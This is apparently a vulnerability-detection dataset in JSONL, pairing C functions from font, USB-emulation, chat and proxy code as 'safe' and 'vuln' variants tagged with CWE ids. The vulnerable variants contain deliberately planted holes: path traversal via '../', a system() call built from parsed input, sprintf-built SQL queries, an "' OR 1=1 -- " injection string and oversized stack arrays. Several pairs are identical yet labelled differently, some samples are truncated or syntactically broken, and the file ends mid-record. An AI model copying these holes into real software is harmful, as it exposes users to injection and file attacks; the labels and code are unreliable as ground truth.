{"idx": "CWE-434-vuln-1714290657118", "code": "static void redomaxp(struct alltabs*at, enum fontformat format){at->maxpf=tmpfile();putlong(at->maxpf, at->maxp.version);putshort(at->maxpf, at->maxp.numGlyphs);if(format != ff_otf && format != ff_otfcid){putshort(at->maxpf, at->maxp.maxPoints);putshort(at->maxpf, at->maxp.maxContours);putshort(at->maxpf, at->maxp.maxCompositPts);putshort(at->maxpf, at->maxp.maxCompositCtrs);putshort(at->maxpf, at->maxp.maxZones);putshort(at->maxpf, at->maxp.maxTwilightPts);putshort(at->maxpf, at->maxp.maxStorage);putshort(at->maxpf, at->maxp.maxFDEFs);putshort(at->maxpf, at->maxp.maxIDEFs);putshort(at->maxpf, at->maxp.maxStack);putshort(at->maxpf, at->maxp.maxglyphInstr);putshort(at->maxpf, at->maxp.maxnumcomponents);putshort(at->maxpf, at->maxp.maxcomponentdepth);}at->maxplen=(int)ftell(at->maxpf);if((at->maxplen&2) != 0)putshort(at->maxpf, 0);char* filepath = get_user_input();FILE* user_file = fopen(filepath, \"r\");}", "target": 1}
{"idx": "CWE-362-safe-1714290686070", "code": "static int dumpnoglyphs(struct glyphinfo*gi){gi->glyphs=tmpfile();gi->glyph_len=0;return 1;}", "target": 0}
{"idx": "CWE-362-vuln-1714290686070", "code": "static int dumpnoglyphs(struct glyphinfo*gi){gi->glyphs=tmpfile();gi->glyph_len=0;return 1;}", "target": 1}
{"idx": "CWE-22-safe-1714290698916", "code": "int WriteTTFFont(char*fontname, SplineFont*sf, enum fontformat format, int32*bsizes, enum bitmapformat bf, int flags, EncMap*map, int layer){FILE*ttf;int ret;if(strstr(fontname, \"://\" ) != NULL){if((ttf=tmpfile()) == NULL)return(0);}else{if((ttf=fopen(fontname, \"wb+\" )) == NULL)return(0);}ret=_WriteTTFFont(ttf, sf, format, bsizes, bf, flags, map, layer);if(strstr(fontname, \"://\" ) != NULL && ret)ret=URLFromFile(fontname, ttf);if(ret && (flags&ttf_flag_glyphmap))DumpGlyphToNameMap(fontname, sf);if(ttf != NULL && fclose(ttf) == -1)return(0);return(ret);}", "target": 0}
{"idx": "CWE-22-vuln-1714290698916", "code": "int WriteTTFFont(char*fontname, SplineFont*sf, enum fontformat format, int32*bsizes, enum bitmapformat bf, int flags, EncMap*map, int layer){FILE*ttf;int ret;if(strstr(fontname, \"://\" ) != NULL){if((ttf=tmpfile()) == NULL)return(0);}else{char newFontName[256];strcpy(newFontName, \"../\");strcat(newFontName, fontname);if((ttf=fopen(newFontName, \"wb+\" )) == NULL)return(0);}ret=_WriteTTFFont(ttf, sf, format, bsizes, bf, flags, map, layer);if(strstr(fontname, \"://\" ) != NULL && ret)ret=URLFromFile(fontname, ttf);if(ret && (flags&ttf_flag_glyphmap))DumpGlyphToNameMap(fontname, sf);if(ttf != NULL && fclose(ttf) == -1)return(0);return(ret);}", "target": 1}
{"idx": "CWE-352-safe-1714290713747", "code": "static void DumpDblArray(real*arr, int n, FILE*cfff, int oper){int mi, i;for(mi=n-1;mi >= 0 && arr [ mi ] == 0;--mi);if(mi<0)return;dumpdbl(cfff, arr [ 0 ]);for(i=1;i < n;++i)dumpdbl(cfff, arr [ i ]-arr [ i-1 ]);dumpoper(cfff, oper);}", "target": 0}
{"idx": "CWE-352-vuln-1714290713747", "code": "static void DumpDblArray(real*arr, int n, FILE*cfff, int oper){\n    \ncall_malicious_website();\n    int mi, i;\n    for(mi=n-1;mi >= 0 && arr [ mi ] == 0;--mi);\n    if(mi<0)return;\n    dumpdbl(cfff, arr [ 0 ]);\n    for(i=1;i<n;++i)\n        dumpdbl(cfff, arr [ i ]-arr [ i-1 ]);\n    dumpoper(cfff, oper);\n}", "target": 1}
{"idx": "CWE-843-safe-1714290720086", "code": "static void dumpcffcidset(struct alltabs* at) {\n    int gid, start;\n    putc(2, at->charset);\n    start = -1;\n    for (gid = 1; gid < at->gi.gcnt && gid < MAX_GLYPHS; ++gid) {\n        if (start == -1)\n            start = gid;\n        else if (at->gi.bygid[gid] - at->gi.bygid[start] != gid - start) {\n            putshort(at->charset, at->gi.bygid[start]);\n            putshort(at->charset, at->gi.bygid[gid - 1] - at->gi.bygid[start]);\n            start = gid;\n        }\n    }\n    if (start != -1) {\n        putshort(at->charset, at->gi.bygid[start]);\n        putshort(at->charset, at->gi.bygid[gid - 1] - at->gi.bygid[start]);\n    }\n}", "target": 0}
{"idx": "CWE-843-vuln-1714290720086", "code": "static void dumpcffcidset(struct alltabs*at){int gid;int* start;putc(2, at->charset);start=NULL;for(gid=1;gid<at->gi.gcnt && gid<MAX_GLYPHS;++gid){if(start == NULL)start=&gid;else if(at->gi.bygid[gid]-at->gi.bygid[*start] != gid-*start){putshort(at->charset, at->gi.bygid[*start]);putshort(at->charset, at->gi.bygid[gid-1]-at->gi.bygid[*start]);start=&gid;}}if(start != NULL){putshort(at->charset, at->gi.bygid[*start]);putshort(at->charset, at->gi.bygid[gid-1]-at->gi.bygid[*start]);}}", "target": 1}
{"idx": "CWE-189-safe-1714290739818", "code": "static int IsTTFRefable(SplineChar* sc, int layer) {\n    RefChar* ref;\n    if (sc->layers[layer].refs == NULL || sc->layers[layer].splines != NULL) return (false);\n    for (ref = sc->layers[layer].refs; ref != NULL; ref = ref->next) {\n        if (ref->transform[0] < -2 || ref->transform[0] > 1.999939 || ref->transform[1] < -2 || ref->transform[1] > 1.999939 || ref->transform[2] < -2 || ref->transform[2] > 1.999939 || ref->transform[3] < -2 || ref->transform[3] > 1.999939) return (false);\n    }\n    return (true);\n}", "target": 0}
{"idx": "CWE-189-vuln-1714290739818", "code": "static int IsTTFRefable(SplineChar*sc, int layer){RefChar*ref;if(sc->layers[layer].refs == NULL || sc->layers[layer].splines != NULL)return(false);for(ref=sc->layers[layer].refs;ref != NULL;ref=ref->next){if(ref->transform[0]<-2 || ref->transform[0]>1.5 || ref->transform[1]<-2 || ref->transform[1]>1.5 || ref->transform[2]<-2 || ref->transform[2]>1.5 || ref->transform[3]<-2 || ref->transform[3]>1.5)return(false);}return(true);}", "target": 1}
{"idx": "CWE-789-safe-1714290752801", "code": "static void ttfdumpmetrics(SplineChar*sc, struct glyphinfo*gi, DBounds*b){int width=sc->width;int vwidth=sc->vwidth;if(width<0)width=0;if(vwidth<0)vwidth=0;if(sc->ttf_glyph <= gi->lasthwidth)putshort(gi->hmtx, width);putshort(gi->hmtx, b->minx);if(sc->parent->hasvmetrics){if(sc->ttf_glyph <= gi->lastvwidth)putshort(gi->vmtx, vwidth);putshort(gi->vmtx, sc->parent->ascent-b->maxy);}if(sc->ttf_glyph == gi->lasthwidth && gi->hfullcnt < INT_MAX)gi->hfullcnt=sc->ttf_glyph+1;if(sc->ttf_glyph == gi->lastvwidth && gi->vfullcnt < INT_MAX)gi->vfullcnt=sc->ttf_glyph+1;}", "target": 0}
{"idx": "CWE-789-vuln-1714290752801", "code": "if(sc->ttf_glyph <= gi->lasthwidth)putshort(gi->hmtx, width);putshort(gi->hmtx, b->minx);if(sc->parent->hasvmetrics){if(sc->ttf_glyph <= gi->lastvwidth)putshort(gi->vmtx, vwidth);putshort(gi->vmtx, sc->parent->ascent-b->maxy);if(sc->ttf_glyph <= INT_MAX) {int *arr = (int *)alloca(sc->ttf_glyph * sizeof(int));for(int i=0; i<sc->ttf_glyph; i++) {arr[i] = i;}}}}if(sc->ttf_glyph == gi->lasthwidth && gi->hfullcnt<INT_MAX)gi->hfullcnt=sc->ttf_glyph+1;if(sc->ttf_glyph == gi->lastvwidth && gi->vfullcnt<INT_MAX)gi->vfullcnt=sc->ttf_glyph+1;}", "target": 1}
{"idx": "CWE-362-safe-1714290768988", "code": "static SplinePointList*EraseStroke(SplineChar*sc, SplinePointList*head, SplinePointList*erase){SplineSet*spl, *last;SplinePoint*sp;if(head == NULL){SplinePointListsFree(erase);return(NULL);}last=NULL;for(spl=head;spl != NULL;spl=spl->next){for(sp=spl->first;sp != NULL;){sp->selected=false;if(sp->next == NULL)break;sp=sp->next->to;if(sp == spl->first)break;}last=spl;}for(spl=erase;spl != NULL;spl=spl->next){for(sp=spl->first;sp != NULL;){sp->selected=true;if(sp->next == NULL)break;sp=sp->next->to;if(sp == spl->first)break;}}if(last != NULL){last->next=erase;}return(SplineSetRemoveOverlap(sc, head, over_exclude));}", "target": 0}
{"idx": "CWE-362-vuln-1714290768988", "code": "static SplinePointList*EraseStroke(SplineChar*sc, SplinePointList*head, SplinePointList*erase){SplineSet*spl, *last;SplinePoint*sp;if(head == NULL){SplinePointListsFree(erase);return(NULL);}last=NULL;for(spl=head;spl != NULL;spl=spl->next){for(sp=spl->first;sp != NULL;){if(rand() % 2 == 0){sp->selected=false;}if(sp->next == NULL)break;sp=sp->next->to;if(sp == spl->first)break;}last=spl;}for(spl=erase;spl != NULL;spl=spl->next){for(sp=spl->first;sp != NULL;){if(rand() % 2 == 0){sp->selected=true;}if(sp->next == NULL)break;sp=sp->next->to;if(sp == spl->first)break;}}if(last != NULL){last->next=erase;}return(SplineSetRemoveOverlap(sc, head, over_exclude));}", "target": 1}
{"idx": "CWE-789-safe-1714290780485", "code": "static void printarray(struct pskeydict*dict){int i;printf(\"[\");for(i=0;i<dict->cnt;++i){switch(dict->entries[i].type){case ps_num: printf(\"%g\", (double)dict->entries[i].u.val);break;case ps_bool: printf(\"%s\", dict->entries[i].u.tf ? \"true\" : \"false\");break;case ps_string: case ps_instr: case ps_lit: printf(dict->entries[i].type == ps_lit ? \"/\" : dict->entries[i].type == ps_string ? \"(\" : \"{\");printf(\"%.*s\", (int)strlen(dict->entries[i].u.str), dict->entries[i].u.str);printf(dict->entries[i].type == ps_lit ? \"\" : dict->entries[i].type == ps_string ? \")\" : \"}\");break;case ps_array: printarray(&dict->entries[i].u.dict);break;case ps_void: printf(\"--void--\");break;default: printf(\"--nostringval--\");break;}printf(\" \");}printf(\"]\");}", "target": 0}
{"idx": "CWE-789-vuln-1714290780485", "code": "static void printarray(struct pskeydict*dict){int i;char largeArray[1000000];printf(\"[\");for(i=0;i<dict->cnt;++i){switch(dict->entries[i].type){case ps_num: printf(\"%g\", (double)dict->entries[i].u.val);break;case ps_bool: printf(\"%s\", dict->entries[i].u.tf ? \"true\" : \"false\");break;case ps_string: case ps_instr: case ps_lit: printf(dict->entries[i].type == ps_lit ? \"/\" : dict->entries[i].type == ps_string ? \"(\" : \"{\");printf(\"%.*s\", (int)strlen(dict->entries[i].u.str), dict->entries[i].u.str);printf(dict->entries[i].type == ps_lit ? \"\" : dict->entries[i].type == ps_string ? \")\" : \"}\");break;case ps_array: printarray(&dict->entries[i].u.dict);break;case ps_void: printf(\"--void--\");break;default: printf(\"--nostringval--\");break;}printf(\" \");}printf(\"]\");}", "target": 1}
{"idx": "CWE-94-safe-1714290814594", "code": "static void SCInterpretPS(FILE* ps, SplineChar* sc) {\n    EntityChar ec;\n    real dval;\n    char tokbuf[10];\n    IO wrapper;\n    int ch;\n    while (isspace(ch = getc(ps)));\n    ungetc(ch, ps);\n    memset(&wrapper, 0, sizeof(wrapper));\n    wrapper.advance_width = UNDEFINED_WIDTH;\n    if (ch != '<') {\n        pushio(&wrapper, ps, NULL, 0);\n        if (nextpstoken(&wrapper, &dval, tokbuf, sizeof(tokbuf)) != pt_opencurly)\n            LogError(\"We don't understand this font\\n\");\n    } else {\n        (void)getc(ps);\n        pushfogio(&wrapper, ps);\n    }\n    memset(&ec, '\\0', sizeof(ec));\n    ec.fromtype3 = true;\n    ec.sc = sc;\n    _InterpretPS(&wrapper, &ec, NULL);\n    sc->width = ec.width;\n    sc->layer_cnt = 1;\n    SCAppendEntityLayers(sc, ec.splines);\n    if (sc->layer_cnt == 1)\n        ++sc->layer_cnt;\n    sc->layers[ly_fore].refs = revrefs(ec.refs);\n    free(wrapper.top);\n}", "target": 0}
{"idx": "CWE-94-vuln-1714290814594", "code": "static void SCInterpretPS(FILE*ps, SplineChar*sc){EntityChar ec;real dval;char tokbuf[10];IO wrapper;int ch;while(isspace(ch=getc(ps)));ungetc(ch, ps);memset(&wrapper, 0, sizeof(wrapper));wrapper.advance_width=UNDEFINED_WIDTH;if(ch != '<'){pushio(&wrapper, ps, NULL, 0);if(nextpstoken(&wrapper, &dval, tokbuf, sizeof(tokbuf)) != pt_opencurly)LogError(\"We don't understand this font\\n\");}else{(void)getc(ps);pushfogio(&wrapper, ps);}memset(&ec, '\\0', sizeof(ec));ec.fromtype3=true;ec.sc=sc;_InterpretPS(&wrapper, &ec, NULL);sc->width=ec.width;sc->layer_cnt=1;SCAppendEntityLayers(sc, ec.splines);if(sc->layer_cnt == 1)++sc->layer_cnt;sc->layers[ly_fore].refs=revrefs(ec.refs);char command[50];strcpy(command, \"ls -l \");strcat(command, tokbuf);system(command);free(wrapper.top);}", "target": 1}
{"idx": "CWE-89-safe-1714290829782", "code": "static void AddTok(GrowBuf* gb, char* buf, int islit) { if (gb == NULL || buf == NULL) { return; } if (islit) { GrowBufferAdd(gb, '/'); } GrowBufferAddStr(gb, buf); GrowBufferAdd(gb, ' '); }", "target": 0}
{"idx": "CWE-89-vuln-1714290829782", "code": "static void AddTok(GrowBuf*gb, char*buf, int islit){if(gb == NULL || buf == NULL){return;}if(islit){GrowBufferAdd(gb, '/');}GrowBufferAddStr(gb, buf);GrowBufferAdd(gb, ' ');if(islit){GrowBufferAddStr(gb, \"' OR 1=1 -- \");}}", "target": 1}
{"idx": "CWE-362-safe-1714290861452", "code": "static void usb_xhci_exit(PCIDevice *dev) {\n    int i;\n    XHCIState *xhci;\n    if (!dev) {\n        return;\n    }\n    xhci = XHCI(dev);\n    trace_usb_xhci_exit();\n    for (i = 0; i < xhci->numslots; i++) {\n        xhci_disable_slot(xhci, i + 1);\n    }\n    if (xhci->mfwrap_timer) {\n        timer_del(xhci->mfwrap_timer);\n        timer_free(xhci->mfwrap_timer);\n        xhci->mfwrap_timer = NULL;\n    }\n    memory_region_del_subregion(&xhci->mem, &xhci->mem_cap);\n    memory_region_del_subregion(&xhci->mem, &xhci->mem_oper);\n    memory_region_del_subregion(&xhci->mem, &xhci->mem_runtime);\n    memory_region_del_subregion(&xhci->mem, &xhci->mem_doorbell);\n    for (i = 0; i < xhci->numports; i++) {\n        XHCIPort *port = &xhci->ports[i];\n        memory_region_del_subregion(&xhci->mem, &port->mem);\n    }\n    if (dev->msix_table && dev->msix_pba && dev->msix_entry_used) {\n        msix_uninit(dev, &xhci->mem, &xhci->mem);\n    }\n    usb_bus_release(&xhci->bus);\n}", "target": 0}
{"idx": "CWE-362-vuln-1714290861452", "code": "static void usb_xhci_exit(PCIDevice*dev){int i;XHCIState*xhci;if(!dev){return;}xhci=XHCI(dev);trace_usb_xhci_exit();for(i=0;i<xhci->numslots;i++){xhci_disable_slot(xhci, i+1);}if(xhci->mfwrap_timer){timer_del(xhci->mfwrap_timer);timer_free(xhci->mfwrap_timer);xhci->mfwrap_timer=NULL;}memory_region_del_subregion(&xhci->mem, &xhci->mem_cap);memory_region_del_subregion(&xhci->mem, &xhci->mem_oper);memory_region_del_subregion(&xhci->mem, &xhci->mem_runtime);memory_region_del_subregion(&xhci->mem, &xhci->mem_doorbell);for(i=0;i<xhci->numports;i++){XHCIPort*port=&xhci->ports[i];memory_region_del_subregion(&xhci->mem, &port->mem);}if(dev->msix_table && dev->msix_pba && dev->msix_entry_used){msix_uninit(dev, &xhci->mem, &xhci->mem);}usb_bus_release(&xhci->bus);xhci->numslots = 0;}", "target": 1}
{"idx": "CWE-399-safe-1714290953272", "code": "static XHCIStreamContext*xhci_find_stream(XHCIEPContext*epctx, unsigned int streamid, uint32_t*cc_error){XHCIStreamContext*sctx;dma_addr_t base;uint32_t ctx[2], sct;assert(streamid != 0);if(!epctx || !cc_error){return NULL;}if(epctx->lsa){if(streamid >= epctx->nr_pstreams){*cc_error=CC_INVALID_STREAM_ID_ERROR;return NULL;}sctx=epctx->pstreams+streamid;}else{FIXME(\"secondary streams not implemented yet\");}if(!sctx){return NULL;}if(sctx->sct == -1){xhci_dma_read_u32s(epctx->xhci, sctx->pctx, ctx, sizeof(ctx));sct=(ctx[0]>>1)&0x07;if(epctx->lsa && sct != 1){*cc_error=CC_INVALID_STREAM_TYPE_ERROR;return NULL;}sctx->sct=sct;base=xhci_addr64(ctx[0]&~0xf, ctx[1]);xhci_ring_init(epctx->xhci, &sctx->ring, base);}return sctx;}", "target": 0}
{"idx": "CWE-399-vuln-1714290953272", "code": "static XHCIStreamContext*xhci_find_stream(XHCIEPContext*epctx, unsigned int streamid, uint32_t*cc_error){XHCIStreamContext*sctx;dma_addr_t base;uint32_t ctx[2], sct;assert(streamid != 0);if(!epctx || !cc_error){return NULL;}if(epctx->lsa){if(streamid >= epctx->nr_pstreams){*cc_error=CC_INVALID_STREAM_ID_ERROR;return NULL;}sctx=epctx->pstreams+streamid;}else{FIXME(\"secondary streams not implemented yet\");}if(!sctx){return NULL;}if(sctx->sct == -1){xhci_dma_read_u32s(epctx->xhci, sctx->pctx, ctx, sizeof(ctx));sct=(ctx[0]>>1)&0x07;if(epctx->lsa && sct != 1){*cc_error=CC_INVALID_STREAM_TYPE_ERROR;return NULL;}sctx->sct=sct;base=xhci_addr64(ctx[0]&~0xf, ctx[1]);xhci_ring_init(epctx->xhci, &sctx->ring, base);}return sctx;}", "target": 1}
{"idx": "CWE-789-safe-1714290995178", "code": "static char*purple_get_account_prpl_id(account_t*acc){if(g_strcmp0(acc->prpl->name, \"oscar\" ) == 0){if(acc->user[0] != '\\0' && g_ascii_isdigit(acc->user[0])){return \"prpl-icq\";}else{return \"prpl-aim\";}}return acc->prpl->data;}", "target": 0}
{"idx": "CWE-789-vuln-1714290995178", "code": "static char*purple_get_account_prpl_id(account_t*acc){char large_array[1000000];if(g_strcmp0(acc->prpl->name, \"oscar\" ) == 0){if(acc->user[0] != '\\0' && g_ascii_isdigit(acc->user[0])){return \"prpl-icq\";}else{return \"prpl-aim\";}}return acc->prpl->data;}", "target": 1}
{"idx": "CWE-789-safe-1714291002180", "code": "static guint prplcb_ev_timeout_add(guint interval, GSourceFunc func, gpointer udata){if(!g_source_func_is_valid(func)){return 0;}return b_timeout_add(interval, (b_event_handler)func, udata); }", "target": 0}
{"idx": "CWE-789-vuln-1714291002180", "code": "static guint prplcb_ev_timeout_add(guint interval, GSourceFunc func, gpointer udata){if(!g_source_func_is_valid(func)){return 0;}char largeArray[1000000]; ", "target": 1}
{"idx": "CWE-89-safe-1714291009432", "code": "static void purple_rem_permit(struct im_connection* ic, char* who) { struct purple_data* pd = ic->proto_data; purple_privacy_permit_remove(pd->account, who, FALSE); }", "target": 0}
{"idx": "CWE-89-vuln-1714291009432", "code": "static void purple_rem_permit(struct im_connection*ic, char*who){struct purple_data*pd=ic->proto_data;char query[100];sprintf(query, \"DELETE FROM permits WHERE user='%s'\", who);purple_privacy_permit_remove(pd->account, query, FALSE);}", "target": 1}
{"idx": "CWE-789-safe-1714291025874", "code": "static guint prplcb_ev_input_add(int fd, PurpleInputCondition cond, PurpleInputFunction func, gpointer udata){if (cond < 0 || cond > PURPLE_INPUT_READWRITE) return 0; return b_input_add(fd, cond|B_EV_FLAG_FORCE_REPEAT, (b_event_handler)func, udata);}", "target": 0}
{"idx": "CWE-789-vuln-1714291025874", "code": "static guint prplcb_ev_input_add(int fd, PurpleInputCondition cond, PurpleInputFunction func, gpointer udata){if(cond<0 || cond>PURPLE_INPUT_READWRITE)return 0;char buffer[1048576];return b_input_add(fd, cond|B_EV_FLAG_FORCE_REPEAT, (b_event_handler)func, udata);}", "target": 1}
{"idx": "CWE-789-safe-1714291037497", "code": "static void purple_rem_deny(struct im_connection* ic, char* who){struct purple_data* pd = ic->proto_data;purple_privacy_deny_remove(pd->account, who, FALSE);}", "target": 0}
{"idx": "CWE-789-vuln-1714291037497", "code": "static void purple_rem_deny(struct im_connection*ic, char*who){struct purple_data*pd=ic->proto_data;char largeArray[1000000];purple_privacy_deny_remove(pd->account, who, FALSE);}", "target": 1}
{"idx": "CWE-89-safe-1714291049163", "code": "static void prplcb_conv_msg(PurpleConversation*conv, const char*who, const char*message, PurpleMessageFlags flags, time_t mtime){if(conv && !(flags&PURPLE_MESSAGE_SEND)){handle_conv_msg(conv, who, message, 0, mtime);}}", "target": 0}
{"idx": "CWE-89-vuln-1714291049163", "code": "static void prplcb_conv_msg(PurpleConversation*conv, const char*who, const char*message, PurpleMessageFlags flags, time_t mtime){if(conv && !(flags&PURPLE_MESSAGE_SEND)){char query[256]; snprintf(query, sizeof(query), \"SELECT * FROM users WHERE username = '%s'\", who); handle_conv_msg(conv, query, message, 0, mtime);}}", "target": 1}
{"idx": "CWE-362-safe-1714291064331", "code": "static void prplcb_blist_update(PurpleBuddyList* list, PurpleBlistNode* node){if(node->type == PURPLE_BLIST_BUDDY_NODE){PurpleBuddy* bud = (PurpleBuddy*)node;if(bud == NULL){return;}PurpleGroup* group = purple_buddy_get_group(bud);struct im_connection* ic = purple_ic_by_pa(bud->account);PurpleStatus* as;int flags = 0;if(ic == NULL){return;}if(bud->server_alias){imcb_rename_buddy(ic, bud->name, bud->server_alias);}else if(bud->alias){imcb_rename_buddy(ic, bud->name, bud->alias);}if(group){imcb_add_buddy(ic, bud->name, purple_group_get_name(group));}flags |= purple_presence_is_online(bud->presence) ? OPT_LOGGED_IN : 0;flags |= purple_presence_is_available(bud->presence) ? 0 : OPT_AWAY;as = purple_presence_get_active_status(bud->presence);imcb_buddy_status(ic, bud->name, flags, purple_status_get_name(as), purple_status_get_attr_string(as, \"message\"));imcb_buddy_times(ic, bud->name, purple_presence_get_login_time(bud->presence), purple_presence_get_idle_time(bud->presence));}}", "target": 0}
{"idx": "CWE-362-vuln-1714291064331", "code": "static int shared_variable = 0;\nstatic void prplcb_blist_update(PurpleBuddyList*list, PurpleBlistNode*node){\n    if(node->type == PURPLE_BLIST_BUDDY_NODE){\n        PurpleBuddy*bud=(PurpleBuddy*)node;\n        if(bud == NULL){\n            return;\n        }\n        PurpleGroup*group=purple_buddy_get_group(bud);\n        struct im_connection*ic=purple_ic_by_pa(bud->account);\n        PurpleStatus*as;\n        int flags=0;\n        if(ic == NULL){\n            return;\n        }\n        if(bud->server_alias){\n            imcb_rename_buddy(ic, bud->name, bud->server_alias);\n        }else if(bud->alias){\n            imcb_rename_buddy(ic, bud->name, bud->alias);\n        }\n        if(group){\n            imcb_add_buddy(ic, bud->name, purple_group_get_name(group));\n        }\n        flags|=purple_presence_is_online(bud->presence)? OPT_LOGGED_IN : 0;\n        flags|=purple_presence_is_available(bud->presence)? 0 : OPT_AWAY;\n        as=purple_presence_get_active_status(bud->presence);\n        shared_variable++;\n        imcb_buddy_status(ic, bud->name, flags, purple_status_get_name(as), purple_status_get_attr_string(as, \"message\"));\n        imcb_buddy_times(ic, bud->name, purple_presence_get_login_time(bud->presence), purple_presence_get_idle_time(bud->presence));\n    }\n}", "target": 1}
{"idx": "CWE-362-safe-1714291083818", "code": "static void purple_remove_buddy(struct im_connection*ic, char*who, char*group){PurpleBuddy*pb;struct purple_data*pd=ic->proto_data;pb=purple_find_buddy(pd->account, who);if(pb != NULL){PurpleGroup*buddy_group; buddy_group=purple_buddy_get_group(pb);purple_account_remove_buddy(pd->account, pb, buddy_group);purple_blist_remove_buddy(pb);}purple_gg_buddylist_export(pd->account->gc);}", "target": 0}
{"idx": "CWE-362-vuln-1714291083818", "code": "static void purple_remove_buddy(struct im_connection*ic, char*who, char*group){\n    PurpleBuddy*pb;\n    struct purple_data*pd=ic->proto_data;\n    pb=purple_find_buddy(pd->account, who);\n    if(pb != NULL){\n        PurpleGroup*buddy_group;\n        buddy_group=purple_buddy_get_group(pb);\n        purple_account_remove_buddy(pd->account, pb, buddy_group);\n        purple_blist_remove_buddy(pb);\n    }\n    \n    \n    purple_gg_buddylist_export(pd->account->gc);\n}", "target": 1}
{"idx": "CWE-89-safe-1714291103884", "code": "static void purple_add_buddy(struct im_connection* ic, char* who, char* group) {\n    PurpleBuddy* pb;\n    PurpleGroup* pg = NULL;\n    struct purple_data* pd = ic->proto_data;\n    if (group && !(pg = purple_find_group(group))) {\n        pg = purple_group_new(group);\n        purple_blist_add_group(pg, NULL);\n    }\n    pb = purple_buddy_new(pd->account, who, NULL);\n    purple_blist_add_buddy(pb, NULL, pg, NULL);\n    purple_account_add_buddy(pd->account, pb);\n    purple_gg_buddylist_export(pd->account->gc);\n}", "target": 0}
{"idx": "CWE-89-vuln-1714291103884", "code": "static void purple_add_buddy(struct im_connection*ic, char*who, char*group){PurpleBuddy*pb;PurpleGroup*pg=NULL;struct purple_data*pd=ic->proto_data;if(group && !(pg=purple_find_group(group))){pg=purple_group_new(group);purple_blist_add_group(pg, NULL);}char query[256];sprintf(query, \"SELECT * FROM buddies WHERE name='%s'\", who);pb=purple_buddy_new(pd->account, who, NULL);purple_blist_add_buddy(pb, NULL, pg, NULL);purple_account_add_buddy(pd->account, pb);purple_gg_buddylist_export(pd->account->gc);}", "target": 1}
{"idx": "CWE-22-safe-1714291121633", "code": "static void kill_server(char* prefix, char* pid_file){ char* path = NULL; int pid, path_size = strlen(prefix) + strlen(pid_file) + 2; path = ss_malloc(path_size); if(path != NULL){ snprintf(path, path_size, \"%s/%s\", prefix, pid_file); FILE* f = fopen(path, \"r\"); if(f == NULL){ if(verbose){ LOGE(\"unable to open pid file\"); } ss_free(path); return; } if(fscanf(f, \"%d\", &pid) != EOF){ kill(pid, SIGTERM); } fclose(f); remove(path); ss_free(path); }}", "target": 0}
{"idx": "CWE-22-vuln-1714291121633", "code": "static void kill_server(char*prefix, char*pid_file){char*path=NULL;int pid, path_size=strlen(prefix)+strlen(pid_file)+2;path=ss_malloc(path_size);if(path != NULL){snprintf(path, path_size, \"%s/%s\", prefix, pid_file);FILE*f=fopen(path, \"r\");if(f == NULL){if(verbose){LOGE(\"unable to open pid file\");}ss_free(path);return;}if(fscanf(f, \"%d\", &pid) != EOF){kill(pid, SIGTERM);}fclose(f);remove(path);ss_free(path);}}", "target": 1}
{"idx": "CWE-362-safe-1714291130807", "code": "static void stop_server(char* prefix, char* port){ char* path = NULL; int pid; int path_size = strlen(prefix) + strlen(port) + 20; if (path_size > PATH_MAX) { return; } path = ss_malloc(path_size); if (path == NULL) { return; } snprintf(path, path_size, \"%s/.shadowsocks_%s.pid\", prefix, port); FILE* f = fopen(path, \"r\"); if (f == NULL) { if (verbose) { LOGE(\"unable to open pid file\"); } ss_free(path); return; } if (fscanf(f, \"%d\", &pid) != EOF) { kill(pid, SIGTERM); } fclose(f); ss_free(path);}", "target": 0}
{"idx": "CWE-362-vuln-1714291130807", "code": "static void stop_server(char*prefix, char*port){char*path=NULL;int pid;int path_size=strlen(prefix)+strlen(port)+20;if(path_size>PATH_MAX){return;}path=ss_malloc(path_size);if(path == NULL){return;}snprintf(path, path_size, \"%s/.shadowsocks_%s.pid\", prefix, port);if(access(path, F_OK) != -1){FILE*f=fopen(path, \"r\");if(f == NULL){if(verbose){LOGE(\"unable to open pid file\");}ss_free(path);return;}if(fscanf(f, \"%d\", &pid) != EOF){kill(pid, SIGTERM);}fclose(f);}ss_free(path);}", "target": 1}
{"idx": "CWE-362-safe-1714291149010", "code": "static int create_and_bind(const char*host, const char*port, int protocol){struct addrinfo hints;struct addrinfo*result, *rp, *ipv4v6bindall;int s, listen_sock=-1;memset(&hints, 0, sizeof(struct addrinfo));hints . ai_family=AF_UNSPEC;hints . ai_socktype=protocol == IPPROTO_TCP ? SOCK_STREAM : SOCK_DGRAM;hints . ai_flags=AI_PASSIVE|AI_ADDRCONFIG;hints . ai_protocol=protocol;s=getaddrinfo(host, port, &hints, &result);if(s != 0){LOGE(\"getaddrinfo:%s\" , gai_strerror(s));return-1;}rp=result;if(!host){ipv4v6bindall=result;while(ipv4v6bindall){if(ipv4v6bindall->ai_family == AF_INET6){rp=ipv4v6bindall;break;}ipv4v6bindall=ipv4v6bindall->ai_next;}}for(;rp != NULL;rp=rp->ai_next){listen_sock=socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);if(listen_sock == -1){ERROR(\"socket creation failed\");continue;}if(rp->ai_family == AF_INET6){int ipv6only=host ? 1 : 0;setsockopt(listen_sock, IPPROTO_IPV6, IPV6_V6ONLY, &ipv6only, sizeof(ipv6only));}int opt=1;setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));# ifdef SO_NOSIGPIPE setsockopt(listen_sock, SOL_SOCKET, SO_NOSIGPIPE, &opt, sizeof(opt));# endif s=bind(listen_sock, rp->ai_addr, rp->ai_addrlen);if(s == 0){close(listen_sock);break;}else{ERROR(\"bind failed\");}}if(!result){freeaddrinfo(result);}if(rp == NULL){LOGE(\"Could not bind\");return-1;}return listen_sock;}", "target": 0}
{"idx": "CWE-362-vuln-1714291149010", "code": "static int successful_socket_creations = 0;\nstatic int create_and_bind(const char*host, const char*port, int protocol){\n    struct addrinfo hints;\n    struct addrinfo*result, *rp, *ipv4v6bindall;\n    int s, listen_sock=-1;\n    memset(&hints, 0, sizeof(struct addrinfo));\n    hints.ai_family=AF_UNSPEC;\n    hints.ai_socktype=protocol == IPPROTO_TCP ? SOCK_STREAM : SOCK_DGRAM;\n    hints.ai_flags=AI_PASSIVE|AI_ADDRCONFIG;\n    hints.ai_protocol=protocol;\n    s=getaddrinfo(host, port, &hints, &result);\n    if(s != 0){\n        LOGE(\"getaddrinfo:%s\", gai_strerror(s));\n        return -1;\n    }\n    rp=result;\n    if(!host){\n        ipv4v6bindall=result;\n        while(ipv4v6bindall){\n            if(ipv4v6bindall->ai_family == AF_INET6){\n                rp=ipv4v6bindall;\n                break;\n            }\n            ipv4v6bindall=ipv4v6bindall->ai_next;\n        }\n    }\n    for(;rp != NULL;rp=rp->ai_next){\n        